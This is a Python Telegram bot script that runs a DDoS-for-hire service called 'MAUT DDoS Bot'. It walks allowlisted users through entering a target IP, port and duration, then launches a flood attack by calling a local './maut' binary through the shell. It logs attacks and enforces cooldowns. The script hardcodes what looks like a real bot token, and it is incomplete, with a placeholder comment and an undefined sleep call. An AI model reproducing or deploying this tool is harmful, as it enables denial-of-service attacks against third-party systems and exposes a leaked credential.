import telebot
import subprocess
import datetime
import os
from telebot import types

# Bot token and admin setup
bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
admin_id = {"8167507955"}
USER_FILE = "users.txt"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 300  # 5 minutes cooldown
MAX_ATTACK_TIME = 180  # 3 minutes max attack

# Dictionary to store user attack data
user_attack_data = {}
maut_cooldown = {}

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
        with open(LOG_FILE, "a") as file:
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
    except Exception as e:
        print(f"Error logging command: {e}")

# Start command with image and instructions
@bot.message_handler(commands=['start'])
def welcome_start(message):
    # Create the welcome message with image
    welcome_text = """
🚀 *Welcome to MAUT DDoS Bot* 🚀

*How to use:*
1. Type /maut to start attack setup
2. The bot will guide you through each step
3. Confirm your attack details
4. Click "Start Attack" button

📌 *Rules:*
- Max attack time: 180 seconds
- 5 minutes cooldown between attacks
- No spam attacks

*Example:*
/maut 1.1.1.1 80 60
"""
    # Send the image first
    try:
        bot.send_photo(message.chat.id, "https://t.me/gggkkkggggiii/8", 
                      caption="⚡ MAUT DDoS Bot - Powerful Attack Tool ⚡")
    except:
        pass
    
    # Send the welcome message
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

# New interactive /maut command
@bot.message_handler(commands=['maut'])
def start_maut_attack(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "Access denied. Contact @seedhe_maut_bot for access.")
    
    # Check cooldown
    if user_id in maut_cooldown:
        elapsed = (datetime.datetime.now() - maut_cooldown[user_id]).seconds
        if elapsed < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - elapsed
            return bot.reply_to(message, f"⏳ Cooldown active. Please wait {remaining} seconds before next attack.")
    
    # Ask for target IP
    msg = bot.reply_to(message, "🌐 Please enter the target IP:")
    bot.register_next_step_handler(msg, process_ip_step)

def process_ip_step(message):
    try:
        user_id = str(message.chat.id)
        ip = message.text.strip()
        
        # Basic IP validation
        if not ip.replace('.', '').isdigit():
            bot.reply_to(message, "❌ Invalid IP address. Please try again with /maut")
            return
            
        user_attack_data[user_id] = {'ip': ip}
        
        # Ask for port
        msg = bot.reply_to(message, "🔌 Please enter the target port:")
        bot.register_next_step_handler(msg, process_port_step)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_port_step(message):
    try:
        user_id = str(message.chat.id)
        port = message.text.strip()
        
        # Basic port validation
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            bot.reply_to(message, "❌ Invalid port. Must be between 1-65535. Please try again with /maut")
            return
            
        user_attack_data[user_id]['port'] = port
        
        # Ask for time
        msg = bot.reply_to(message, "⏱ Please enter attack duration in seconds (max 180):")
        bot.register_next_step_handler(msg, process_time_step)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_time_step(message):
    try:
        user_id = str(message.chat.id)
        time = message.text.strip()
        
        # Validate time
        if not time.isdigit() or not (1 <= int(time) <= MAX_ATTACK_TIME):
            bot.reply_to(message, f"❌ Invalid time. Must be 1-{MAX_ATTACK_TIME} seconds. Please try again with /maut")
            return
            
        user_attack_data[user_id]['time'] = time
        
        # Show confirmation with buttons
        markup = types.InlineKeyboardMarkup()
        confirm_btn = types.InlineKeyboardButton("✅ Start Attack", callback_data="confirm_attack")
        cancel_btn = types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        markup.add(confirm_btn, cancel_btn)
        
        attack_details = user_attack_data[user_id]
        bot.send_message(
            message.chat.id,
            f"⚡ *Attack Details:*\n\n"
            f"🌐 IP: `{attack_details['ip']}`\n"
            f"🔌 Port: `{attack_details['port']}`\n"
            f"⏱ Time: `{attack_details['time']}` seconds\n\n"
            f"Confirm to start attack:",
            parse_mode="Markdown",
            reply_markup=markup
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle button clicks
@bot.callback_query_handler(func=lambda call: True)
def handle_button_click(call):
    try:
        user_id = str(call.message.chat.id)
        
        if call.data == "confirm_attack":
            if user_id not in user_attack_data:
                bot.answer_callback_query(call.id, "❌ Attack data expired. Start again with /maut")
                return
                
            attack_data = user_attack_data[user_id]
            ip = attack_data['ip']
            port = attack_data['port']
            time = attack_data['time']
            
            # Start the attack
            try:
                subprocess.Popen(f"./maut {ip} {port} {time} 900", shell=True)
                log_command(user_id, ip, port, time)
                maut_cooldown[user_id] = datetime.datetime.now()
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"🔥 *Attack Launched!* 🔥\n\n"
                         f"🌐 Target: `{ip}`\n"
                         f"🔌 Port: `{port}`\n"
                         f"⏱ Duration: `{time}` seconds\n"
                         f"⏳ Cooldown: 5 minutes\n\n"
                         f"⚡ Powered by @seedhe_maut_bot",
                    parse_mode="Markdown"
                )
                
                # Send new attack button
                markup = types.InlineKeyboardMarkup()
                new_attack_btn = types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack")
                markup.add(new_attack_btn)
                
                bot.send_message(
                    call.message.chat.id,
                    "Attack started successfully!",
                    reply_markup=markup
                )
                
            except Exception as e:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"❌ Error starting attack: {str(e)}"
                )
                
        elif call.data == "cancel_attack":
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="❌ Attack cancelled"
            )
            
        elif call.data == "new_attack":
            if user_id in maut_cooldown:
                elapsed = (datetime.datetime.now() - maut_cooldown[user_id]).seconds
                if elapsed < COOLDOWN_TIME:
                    remaining = COOLDOWN_TIME - elapsed
                    bot.answer_callback_query(call.id, f"⏳ Cooldown active. Wait {remaining} seconds")
                    return
            
            # Start new attack process
            msg = bot.send_message(call.message.chat.id, "🌐 Please enter the target IP for new attack:")
            bot.register_next_step_handler(msg, process_ip_step)
            
        bot.answer_callback_query(call.id)
        
    except Exception as e:
        print(f"Error handling button click: {e}")

# ... [Keep all your existing admin commands and other functions unchanged] ...

if __name__ == '__main__':
    print("MAUT DDoS Bot started...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {e}")
            sleep(5)
